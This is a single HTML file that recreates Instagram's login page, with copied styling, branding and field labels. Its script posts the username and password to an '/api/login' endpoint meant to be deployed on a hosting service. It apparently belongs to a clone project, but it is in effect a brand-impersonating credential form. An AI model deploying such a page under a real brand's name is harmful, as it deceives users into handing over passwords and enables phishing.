     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Instagram</title>
         <!-- Your existing styles here (from previous code) -->
         <style>
             /* Paste your previous CSS here - body, .container, .logo, .form, etc. */
             body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
             .container { max-width: 350px; width: 100%; text-align: center; }
             .logo { font-family: "Dancing Script", cursive; font-size: 48px; color: #262626; margin-bottom: 32px; }
             .form { background: #fff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 40px 40px 20px; margin-bottom: 10px; }
             .input-group { margin-bottom: 6px; text-align: left; }
             .input-group label { display: block; font-size: 13px; color: #8e8e8e; margin-bottom: 4px; }
             input[type="text"], input[type="password"] { width: 100%; padding: 9px 0 7px 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; box-sizing: border-box; }
             input[type="text"]:focus, input[type="password"]:focus { border-color: #0095f6; outline: none; background: #fff; }
             .login-btn { width: 100%; background: #0095f6; color: #fff; border: none; border-radius: 5px; padding: 7px 16px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 8px; }
             .login-btn:hover { background: #1877f2; }
             .error-message { background: #fdf2f2; border: 1px solid #ed4956; color: #ed4956; padding: 8px; border-radius: 3px; margin: 10px 0; font-size: 14px; display: none; text-align: center; }
             .success-message { background: #e7f3ff; border: 1px solid #0095f6; color: #0095f6; padding: 8px; border-radius: 3px; margin: 10px 0; font-size: 14px; display: none; text-align: center; }
         </style>
     </head>
     <body>
         <div class="container">
             <h1 class="logo">Instagram</h1>
             <form id="loginForm" class="form">
                 <div class="input-group">
                     <label for="identifier">Phone number, username, or email</label>
                     <input type="text" id="identifier" name="identifier" required placeholder="Phone number, username, or email">
                 </div>
                 <div class="input-group">
                     <label for="password">Password</label>
                     <input type="password" id="password" name="password" required placeholder="Password">
                 </div>
                 <button type="submit" class="login-btn">Log In</button>
                 <div id="errorMessage" class="error-message"></div>
                 <div id="successMessage" class="success-message"></div>
             </form>
             <a href="signup.html" style="color: #0095f6; text-decoration: none; font-weight: 600;">Don't have an account? Sign up</a>
         </div>
         <script>
             const form = document.getElementById('loginForm');
             const errorMessage = document.getElementById('errorMessage');
             const successMessage = document.getElementById('successMessage');

             form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 const identifier = document.getElementById('identifier').value.trim();
                 const password = document.getElementById('password').value;

                 if (!identifier || !password) {
                     showError('Please enter your email/username and password.');
                     return;
                 }

                 // Local test: Use relative URL. For deployment: Change to 'https://your-render-url.onrender.com/api/login'
                 const API_URL = '/api/login'; // Local: /api/login | Deployment: full URL

                 try {
                     console.log('Sending login request to:', API_URL); // Debug log
                     const response = await fetch(API_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ identifier, password })
                     });
                     const data = await response.json();
                     console.log('Login response:', data); // Debug log

                     if (data.success) {
                         showSuccess(data.message);
                         localStorage.setItem('currentUser ', JSON.stringify(data.user));
                         setTimeout(() => { window.location.href = 'dashboard.html'; }, 2000);
                     } else {
                         showError(data.error || 'Unknown error');
                     }
                 } catch (err) {
                     console.error('Login fetch error:', err); // Debug
                     showError('Network error: ' + err.message + '. Check console.');
                 }
             });

             function showError(msg) {
                 errorMessage.textContent = msg;
                 errorMessage.style.display = 'block';
                 successMessage.style.display = 'none';
             }

             function showSuccess(msg) {
                 successMessage.textContent = msg;
                 successMessage.style.display = 'block';
                 errorMessage.style.display = 'none';
             }
         </script>
     </body>
     </html>
